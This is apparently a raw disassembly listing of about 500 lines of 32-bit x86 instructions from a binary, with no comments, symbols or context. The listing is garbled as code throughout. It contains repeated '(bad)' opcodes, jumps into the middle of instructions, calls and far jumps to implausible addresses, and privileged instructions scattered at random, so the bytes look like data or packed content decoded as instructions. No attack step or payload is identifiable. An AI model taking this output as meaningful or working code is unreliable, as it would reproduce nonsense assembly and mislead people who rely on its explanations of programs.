  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
